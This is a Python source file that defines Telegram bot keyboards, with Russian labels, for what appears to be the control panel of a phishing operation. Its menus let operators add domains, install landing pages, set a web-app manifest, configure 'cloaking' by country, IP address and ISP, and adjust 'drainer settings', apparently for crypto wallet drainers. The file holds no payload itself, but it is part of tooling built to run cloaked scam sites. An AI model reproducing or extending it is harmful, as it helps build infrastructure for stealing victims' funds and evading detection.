from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select
from database.models import User, Domains, SubDomains, Landing


async def get_domain_kb(user, session: AsyncSession):
    domains_query = await session.execute(select(Domains).where(Domains.user_tg_id == user.tg_id))
    domains = domains_query.scalars().all()
    subdomains_query = await session.execute(select(SubDomains).where(SubDomains.user_tg_id == user.tg_id))
    subdomains = subdomains_query.scalars().all()

    domain_kb = []

    for domain in domains:
        domain_text = f"{domain.domain}"  # Текст кнопки с доменом
        domain_kb.append([InlineKeyboardButton(text=domain_text, callback_data=f'domain_settings|{domain.id}')])
        # # Add subdomains as nested buttons under the domain
        # domain_subdomains = [sub for sub in subdomains if sub.domain_id == domain.id]
        # if domain_subdomains:
        #     for subdomain in domain_subdomains:
        #         subdomain_text = f"  └─ {subdomain.subdomain}"
        #         domain_kb.append(
        #             [InlineKeyboardButton(text=subdomain_text, callback_data=f'select_subdomain|{subdomain.id}')])

    domain_kb.append([InlineKeyboardButton(text='🔗 Добавить домен', callback_data=f'create_domain')])
    domain_menu = InlineKeyboardMarkup(row_width=1, inline_keyboard=domain_kb)  # row_width = 1 for vertical layout

    return domain_menu


# choose_domains_type_kb = [
#     [InlineKeyboardButton(text='👥Общий', callback_data='domain_public'),
#      InlineKeyboardButton(text='👤 Приватный ', callback_data='domain_private')],
#     [InlineKeyboardButton(text='🔙 Назад', callback_data='back_to_profile')]
# ]
#
# choose_domains_type = InlineKeyboardMarkup(row_width=2, inline_keyboard=choose_domains_type_kb)
#
#
# async def get_public_domains_kb(session: AsyncSession):
#     domain_query = await session.execute(select(Domains).where(Domains.type == 'public'))
#     domains = domain_query.scalars().all()
#     public_domains_kb = []
#     if domains:
#         for domain in domains:
#             domain_text = f'{domain.domain}'
#             public_domains_kb.append(
#                 [InlineKeyboardButton(text=domain_text, callback_data=f'create_public_domain|{domain.id}')]
#             )
#     public_domains_kb.append([InlineKeyboardButton(text='🔙 Назад', callback_data='back_to_profile')])
#     kb = InlineKeyboardMarkup(row_width=1, inline_keyboard=public_domains_kb)

back_to_profile_kb = [
    [InlineKeyboardButton(text='🔙 Назад', callback_data='back_to_profile')]
]
back_to_profile = InlineKeyboardMarkup(inline_keyboard=back_to_profile_kb)


def get_found_domain_kb(domain_id):
    found_domain_kb = [
        [InlineKeyboardButton(text='🌐 К настройкам домена', callback_data=f'domain_settings|{domain_id}'),
         InlineKeyboardButton(text='🔙 Назад', callback_data='back_to_domains')]
    ]
    found_domain = InlineKeyboardMarkup(inline_keyboard=found_domain_kb)

    return found_domain


def create_chosen_domain_kb(domain_id):
    chosen_domain_kb = [
        [InlineKeyboardButton(text='✏️ Дизайн', callback_data=f'domain_design|{domain_id}'),
         InlineKeyboardButton(text='⚙️ Манифест ', callback_data=f'manifest_settings|{domain_id}')],
        [InlineKeyboardButton(text='⛔️ Клоака', callback_data=f'cloaka_settings|{domain_id}'),
         InlineKeyboardButton(text='💻 Настройки дрейнера', callback_data=f'drainer_settings|{domain_id}')],
        [InlineKeyboardButton(text='📊 Статистика', callback_data=f'statistics_settings|{domain_id}'),
         InlineKeyboardButton(text='↕️ Скопировать настройки', callback_data=f'copy_settings|{domain_id}')],
        [InlineKeyboardButton(text='🔙 Назад', callback_data='back_to_domains'),
         InlineKeyboardButton(text='♻️ Удалить', callback_data=f'delete_domain|{domain_id}')]
    ]
    chosen_domain = InlineKeyboardMarkup(inline_keyboard=chosen_domain_kb)

    return chosen_domain


async def get_landing_kb(session: AsyncSession):
    landings_query = await session.execute(select(Landing))
    landings = landings_query.scalars().all()
    landings_kb = []

    if landings:
        row = []  # Temporary row to hold buttons before appending to the main keyboard
        for landing in landings:
            landing_text = f'{landing.name}'
            row.append(InlineKeyboardButton(text=landing_text, callback_data=f'choose_landing|{landing.id}'))

            if len(row) == 3:  # If we have 3 buttons in the row, append it and reset
                landings_kb.append(row)
                row = []

        if row:  # Append any remaining buttons (less than 3)
            landings_kb.append(row)

    landings_kb.append([InlineKeyboardButton(text='🔙 Назад', callback_data='back_to_domains')])
    kb = InlineKeyboardMarkup(row_width=3, inline_keyboard=landings_kb)  # row_width doesn't matter much now

    return kb


landing_menu_kb = [
    [InlineKeyboardButton(text='Установить', callback_data='install_landing'),
     InlineKeyboardButton(text='🔙 Назад', callback_data='back_to_landings')]
]

landing_menu = InlineKeyboardMarkup(inline_keyboard=landing_menu_kb)

manifest_kb = [
    [InlineKeyboardButton(text='💠 Ссылка', callback_data='dom_manifest_link'),
     InlineKeyboardButton(text='📝 Название', callback_data='dom_manifest_name'),
     InlineKeyboardButton(text='🖼 Изображение', callback_data='dom_manifest_image')],
    [InlineKeyboardButton(text='🔙 Назад', callback_data='back_to_domains')]
]

manifest = InlineKeyboardMarkup(inline_keyboard=manifest_kb, row_width=3)

cloakings_kb = [
    [InlineKeyboardButton(text='🌍 Страны', callback_data='dom_cloaking_countries'),
     InlineKeyboardButton(text='🔒 IP Адреса', callback_data='dom_cloaking_ips')],
    [InlineKeyboardButton(text='🏢 ISP провайдеры', callback_data='dom_cloaking_isp')],
    [InlineKeyboardButton(text='🔙 Назад', callback_data='back_to_domains')]
]

cloaking = InlineKeyboardMarkup(inline_keyboard=cloakings_kb, row_width=2)

back_to_domains_kb = [
    [InlineKeyboardButton(text='🔙 Назад', callback_data='back_to_domains')]
]
back_to_domains = InlineKeyboardMarkup(inline_keyboard=back_to_domains_kb)


async def get_copy_domain_kb(session: AsyncSession, user: User, domain_id):
    domains_query = await session.execute(
        select(Domains).where(Domains.user_tg_id == user.tg_id, Domains.id != domain_id)  # Exclude domain_id
    )
    domains = domains_query.scalars().all()
    copy_domains_kb = []

    if domains:
        for domain in domains:
            domain_text = f'{domain.domain}'
            copy_domains_kb.append(
                [InlineKeyboardButton(text=f'🌐 {domain_text}', callback_data=f'copy_domain_settings|{domain.id}')]
            )
    copy_domains_kb.append([InlineKeyboardButton(text='🔙 Назад', callback_data='back_to_domains')])
    kb = InlineKeyboardMarkup(row_width=1, inline_keyboard=copy_domains_kb)

    return kb


delete_confirm_kb = [
    [InlineKeyboardButton(text='✅ Да', callback_data='delete_confirm'),
     InlineKeyboardButton(text='❌ Нет', callback_data='delete_cancel')]
]

delete_confirm = InlineKeyboardMarkup(inline_keyboard=delete_confirm_kb)
